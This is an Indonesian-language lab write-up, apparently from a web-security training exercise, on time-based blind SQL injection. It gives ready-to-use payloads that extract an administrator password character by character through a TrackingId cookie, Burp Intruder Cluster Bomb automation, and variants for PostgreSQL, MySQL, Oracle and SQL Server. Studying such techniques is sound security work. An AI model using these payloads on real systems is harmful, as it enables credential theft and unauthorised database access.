
# Blind SQL injection with time delays and information retrieval


## **1. Konsep Dasar**
Blind SQL Injection dengan time delays digunakan untuk mengekstrak informasi dari database menggunakan waktu respons sebagai indikator. Dengan payload yang menginduksi penundaan, kita dapat mendeteksi karakter tertentu dari data seperti password.

---

## **Penjelasan Query**
### **Langkah-Langkah Query**
1. **Validasi Penundaan Waktu**  
   Uji apakah server merespons dengan delay menggunakan:
   ```sql
   COOKIE'||pg_sleep(10)--
   ```
   Jika server menunda respons selama 10 detik, maka injeksi berhasil.

2. **Kondisi Logis**  
   Gunakan kondisi logis untuk membandingkan nilai:
   ```sql
   SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
   ```
   Payload:
   ```plaintext
   TrackingId=jIPoq0qYcS0Y2AmF'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
   ```

3. **Ekstraksi Data**  
   Ekstrak karakter pertama password menggunakan fungsi substring:
   ```sql
   SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
   ```
   Payload:
   ```plaintext
   TrackingId=jIPoq0qYcS0Y2AmF'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
   ```

4. **Iterasi Tiap Karakter**  
   Gunakan fungsi iteratif untuk memeriksa setiap karakter hingga password lengkap.

---

## **2. Brute Force dengan Cluster Bomb**
Cluster Bomb adalah fitur di Burp Suite Intruder untuk mencoba berbagai kombinasi payload secara sistematis.

### **Langkah-Langkah:**
1. **Buka Burp Suite**  
   Arahkan request yang mengandung parameter SQL Injection ke **Intruder**.

2. **Atur Payload Position**  
   Tandai parameter yang akan diuji, seperti:
   ```
   TrackingId=2Ls9s94z7mt1Xnj2'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
   ```
   Tandai posisi:
   - **§1§**: Posisi indeks karakter.
   - **§a§**: Posisi karakter yang akan diuji.

3. **Set Payload**  
   - **Payload Set 1 (Index)**: 1 hingga panjang maksimal password, misalnya 1–20.
   - **Payload Set 2 (Karakter)**: Semua karakter yang mungkin, seperti:
     ```
     abcdefghijklmnopqrstuvwxyz0123456789
     ```

4. **Konfigurasi Cluster Bomb**  
   Pilih mode **Cluster Bomb** untuk mencoba setiap kombinasi indeks dan karakter.

5. **Uji Respons Waktu**  
   Jalankan attack dan perhatikan waktu respons. Karakter yang memakan waktu lebih lama menandakan nilai yang benar.

---

## **3. Database Lain**
### **MySQL**
Gunakan fungsi `SLEEP`:
```sql
TrackingId='||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN SLEEP(10) ELSE SLEEP(0) END)--
```

### **Oracle**
Gunakan fungsi `DBMS_LOCK.SLEEP`:
```sql
TrackingId='||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN DBMS_LOCK.SLEEP(10) ELSE DBMS_LOCK.SLEEP(0) END FROM dual)--
```

### **Microsoft SQL Server**
Gunakan `WAITFOR DELAY`:
```sql
TrackingId='; IF (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') WAITFOR DELAY '00:00:10'--
```

---

## **Hasil Akhir**
Dengan menggunakan teknik ini dan memanfaatkan **Cluster Bomb**:
1. Setiap respons delay akan mengindikasikan karakter password yang benar.
2. Ulangi proses untuk semua indeks hingga password lengkap diperoleh.

**Contoh Hasil:**
Password ditemukan: `v06vaymszli7v131izpv`
